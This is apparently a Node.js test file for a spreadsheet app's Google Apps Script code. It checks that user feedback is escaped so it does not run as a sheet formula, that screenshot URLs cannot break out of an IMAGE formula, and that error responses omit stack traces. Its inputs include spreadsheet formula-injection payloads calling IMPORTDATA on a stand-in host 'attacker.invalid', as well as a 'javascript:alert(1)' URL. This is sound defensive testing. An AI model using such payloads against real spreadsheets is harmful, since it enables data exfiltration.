const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const vm = require('node:vm');
const path = require('node:path');
const context = {};
vm.runInNewContext(fs.readFileSync(path.join(__dirname, '../非代码资料/停用功能/google-apps-script/Code.gs'), 'utf8'), context);

test('review feedback remains text instead of executing sheet formulas', () => {
  assert.equal(context.safeFeedbackText_('=IMPORTDATA("https://attacker.invalid")'), '\'=IMPORTDATA("https://attacker.invalid")');
  assert.equal(context.safeFeedbackText_('  =1+1'), "'  =1+1");
  for (const text of ['普通反馈', '-10', 'a=b', '', "'already literal"]) {
    assert.equal(context.safeFeedbackText_(text), text);
  }
});

test('screenshot URLs cannot escape the IMAGE formula string', () => {
  assert.equal(context.feedbackImageFormula_('https://example.com/a.png'), '=IMAGE("https://example.com/a.png")');
  const attack = 'https://example.com/"&IMPORTDATA("https://attacker.invalid")&"';
  assert.equal(context.feedbackImageFormula_(attack), '=IMAGE("https://example.com/""&IMPORTDATA(""https://attacker.invalid"")&""")');
  for (const value of ['javascript:alert(1)', 'data:image/png;base64,abc', '=1+1', 'https://example.com/\nfoo']) {
    assert.throws(() => context.feedbackImageFormula_(value));
  }
  assert.equal(context.feedbackImageFormula_(''), '');
});

test('collaboration errors do not return server stack traces', () => {
  const collab = { ContentService: {
    MimeType: { JSON: 'application/json' },
    createTextOutput(text) { return { text, setMimeType() { return this; } }; },
  } };
  vm.runInNewContext(fs.readFileSync(path.join(__dirname, '../apps/sheetmind/collab/Code.gs.js'), 'utf8'), collab);
  const response = JSON.parse(collab.doPost({ postData: { contents: '{invalid' } }).text);
  assert.ok(response.error);
  assert.equal(response.stack, undefined);
});
